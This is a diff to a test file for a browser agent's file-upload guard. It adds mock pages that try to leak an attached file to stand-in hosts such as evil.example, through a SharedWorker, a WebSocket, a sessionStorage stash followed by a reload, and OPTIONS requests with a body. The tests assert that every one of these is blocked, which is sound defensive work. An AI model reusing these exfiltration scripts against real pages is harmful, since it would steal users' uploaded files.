@@ -4,6 +4,7 @@
 // Each refusal has a control (the same page shape that is allowed) and a counter on the far side.
 //   npm run build && npm run test:upload-form
 import { createServer } from "node:http";
+import { WebSocketServer } from "ws";
 import { mkdtempSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -86,11 +87,25 @@ const server = createServer((req, res) => {
       case "/frame-same": return page(res, "FrameSame", `<h1>HOST</h1><iframe src="http://apply.jobs.example:${P}/frame-form"></iframe>`);
       case "/swap": return page(res, "Swap", `${form("/apply")}<script>window.swap = () => document.getElementById("f").setAttribute("action", ${JSON.stringify(A("/collect"))});</script>`);
       case "/xhr": return page(res, "Xhr", `${form("/apply")}<button id="x" type="button" onclick="fetch('${A("/collect")}', {method: 'POST', mode: 'no-cors', body: new FormData(document.getElementById('f'))})">send</button>`);
+      case "/swk.js": res.writeHead(200, { "content-type": "text/javascript" }); return res.end(`onconnect = (c) => { const p = c.ports[0]; p.onmessage = (e) => { fetch("http://evil.example:${P}/via-shared-worker", { method: "POST", mode: "no-cors", body: e.data }); }; };`);
+      case "/shared-leak": return page(res, "SharedLeak", `${form("/apply")}<script>const sw = new SharedWorker("/swk.js"); document.getElementById("cv").addEventListener("change", (ev) => sw.port.postMessage(ev.target.files[0]));</script>`);
+      case "/ws-leak": return page(res, "WsLeak", `${form("/apply")}<script>window.wsTo = (u, path) => { const s = new WebSocket(u + path); s.onopen = async () => { s.send(await document.getElementById("cv").files[0].text()); }; };</script>`);
+      case "/stash-reload": return page(res, "StashReload", `${form("/apply")}<script>
+        if (sessionStorage.getItem("stash")) { addEventListener("DOMContentLoaded", () => setTimeout(() => fetch("http://evil.example:${P}/via-reload", { method: "POST", mode: "no-cors", body: sessionStorage.getItem("stash") }), 200)); }
+        document.getElementById("cv").addEventListener("change", (ev) => { const r = new FileReader(); r.onload = () => { sessionStorage.setItem("stash", String(r.result)); setTimeout(() => location.reload(), 300); }; r.readAsText(ev.target.files[0]); });
+      </script>`);
       case "/popup-host": return page(res, "PopupHost", `${form("/apply")}<button id="pop" type="button" onclick="window.open('${J}/popup-form')">pop</button>`);
       case "/popup-form": return page(res, "PopupForm", `<form id="p" method="post" action="${A("/collect")}"><input name="x" value="1"><button id="pgo">send</button></form>`);
       default: return page(res, "Jobs", "<h1>Jobs home</h1>");
     }
   });
+});
+const wss = new WebSocketServer({ noServer: true });
+server.on("upgrade", (req, sock, head) => {
+  const host = String(req.headers.host).split(":")[0];
+  const path = new URL(req.url, "http://x").pathname;
+  (hits[host] ??= []).push(`UPGRADE ${path}`);
+  wss.handleUpgrade(req, sock, head, (c) => c.on("message", (m) => (hits[host] ??= []).push(`WSMSG ${path} ${String(m).includes(MARK) ? "(file)" : "(no file)"}`)));
 });
 await new Promise((r) => server.listen(0, "127.0.0.1", r));
 P = server.address().port;
@@ -161,10 +176,10 @@ const refOfFileField = async () => {
   await settle(800);
   assert.deepStrictEqual(posts("jobs.example"), ["POST /apply (file)"], `the form did not reach its own server: ${JSON.stringify(hits)}`);
   assert.ok(/THANKS-FOR-APPLYING/.test((await call("text")).text), "the thank-you page was not reached");
-  // the thank-you page is a new document on the same site: nothing is attached there, so nothing is held, and its own script may tell another listed site
+  // the thank-you page is a new document on the same site: the hold stays (a page that read the file can keep it across a reload, adversary round 3 A55), so its own script cannot post to another site until the tab leaves
   await call("click", { selector: "#t" });
   await settle(600);
-  assert.deepStrictEqual(posts("ats.example"), ["POST /collect (no file)"], `the hold outlived the document the file was attached in: ${JSON.stringify(hits)}`);
+  assert.deepStrictEqual(posts("ats.example"), [], `the hold ended with the first document, and a page that kept the file's bytes could send them on: ${JSON.stringify(hits)}`);
   for (const ok of ["/absolute", "/subdomain", "/clobber-good", "/shadow-good", "/noaction", "/base-empty-action", "/formaction-type-button", "/target-self"]) {
     await fresh();
     await call("open", { url: J(ok) });
@@ -284,7 +299,58 @@ const refOfFileField = async () => {
   await live().page.evaluate((u) => fetch(u, { method: "HEAD", mode: "no-cors" }).catch(() => {}), A("/collect"));
   await settle(500);
   assert.ok((hits["ats.example"] ?? []).includes("HEAD /collect"), `a HEAD request was held while a file was attached: ${JSON.stringify(hits)}`);
+  // OPTIONS is not a plain read: a script can give it a body (adversary round 3, A53), and the preflight a browser sends itself is not routed through the page at all
+  await fresh();
+  await call("open", { url: J("/good") });
+  assert.ok(!(await upload({ selector: "#cv" })).isError);
+  await live().page.evaluate((u) => fetch(u, { method: "OPTIONS", mode: "no-cors", body: "stand-in for the file's bytes" }).catch(() => {}), A("/opt-body"));
+  await live().page.evaluate((u) => new Promise((r) => { const x = new XMLHttpRequest(); x.open("OPTIONS", u); x.onloadend = r; x.send("stand-in for the file's bytes"); }), A("/opt-xhr"));
+  await settle(600);
+  assert.ok(!(hits["ats.example"] ?? []).some((x) => x.startsWith("OPTIONS")), `an OPTIONS request with a body left the page while a file was attached: ${JSON.stringify(hits)}`);
   console.log("[ok] while a file is attached, a form the page rewrote after the check and a script's fetch to another site are stopped on the network and the agent is told; the form's own site still receives the file");
+}
+
+// 4a. A page that read the file and reloads itself is still the page the file was attached on (adversary round 3, A55)
+{
+  await fresh();
+  await call("open", { url: J("/stash-reload") });
+  await settle(400);
+  assert.ok(!(await upload({ selector: "#cv" })).isError);
+  await settle(1800);
+  assert.ok(!(hits["evil.example"] ?? []).some((x) => x.includes("(file)")), `a page that kept the file across a reload sent it on: ${JSON.stringify(hits)}`);
+  assert.ok((hits["jobs.example"] ?? []).filter((x) => x === "GET /stash-reload").length >= 2, `control: the page did not reload: ${JSON.stringify(hits)}`);
+  console.log("[ok] a reload of the attached page does not end the hold: the bytes a page kept in its storage cannot be sent to another site by the next document");
+}
+
+// 4b. Channels that are not a request from the tab's own frame: a SharedWorker (no frame) and a WebSocket (never routed as a request) must not carry the attached file elsewhere (adversary round 3, A52, A54)
+{
+  const fileOnce = async (host, path) => { await settle(500); return (hits[host] ?? []).filter((x) => x.includes(path) && x.includes("(file)")); };
+  await fresh();
+  await call("open", { url: J("/shared-leak") });
+  await settle(600);
+  assert.ok(!(await upload({ selector: "#cv" })).isError);
+  await settle(1200);
+  assert.deepStrictEqual(await fileOnce("evil.example", "/via-shared-worker"), [], `a shared worker sent the attached file to an unlisted host (SharedWorker should not exist): ${JSON.stringify(hits)}`);
+  // control: without a file attached the same worker is not stopped by the hold (it still reaches nothing here, because evil.example is not listed, but the request is made)
+  const wsUrl = (host, path) => `ws://${host}:${P}${path}`;
+  // a WebSocket from the attached page to another LISTED platform
+  await fresh();
+  await call("open", { url: J("/ws-leak") });
+  assert.ok(!(await upload({ selector: "#cv" })).isError);
+  await live().page.evaluate(([u, p]) => window.wsTo(u, p), [wsUrl("ats.example", ""), "/ws-other-platform"]);
+  await settle(1200);
+  assert.deepStrictEqual(await fileOnce("ats.example", "/ws-other-platform"), [], `a WebSocket carried the attached file to another listed platform: ${JSON.stringify(hits)}`);
+  assert.ok(!(hits["ats.example"] ?? []).some((x) => x.startsWith("UPGRADE /ws-other-platform")), `the socket to another platform was opened: ${JSON.stringify(hits)}`);
+  // control: the page's own site still gets a socket while the file is attached; and with nothing attached a socket to another listed host is untouched
+  await live().page.evaluate(([u, p]) => window.wsTo(u, p), [wsUrl("jobs.example", ""), "/ws-own"]);
+  await settle(1200);
+  assert.ok((hits["jobs.example"] ?? []).includes("WSMSG /ws-own (file)"), `the page's own site could not be reached by socket while a file was attached: ${JSON.stringify(hits)}`);
+  await fresh();
+  await call("open", { url: J("/ws-leak") });
+  await live().page.evaluate(([u, p]) => { const s = new WebSocket(u + p); s.onopen = () => s.send("hello"); }, [wsUrl("ats.example", ""), "/ws-no-file"]);
+  await settle(1000);
+  assert.ok((hits["ats.example"] ?? []).includes("WSMSG /ws-no-file (no file)"), `a socket to a listed host was stopped when no file was attached: ${JSON.stringify(hits)}`);
+  console.log("[ok] while a file is attached, a shared worker (no frame) and a WebSocket to another listed platform are held to the page's own site; the own site's socket and sockets with nothing attached work");
 }
 
 // 5. A window the page opens is the page's doing; leaving for another site ends the hold
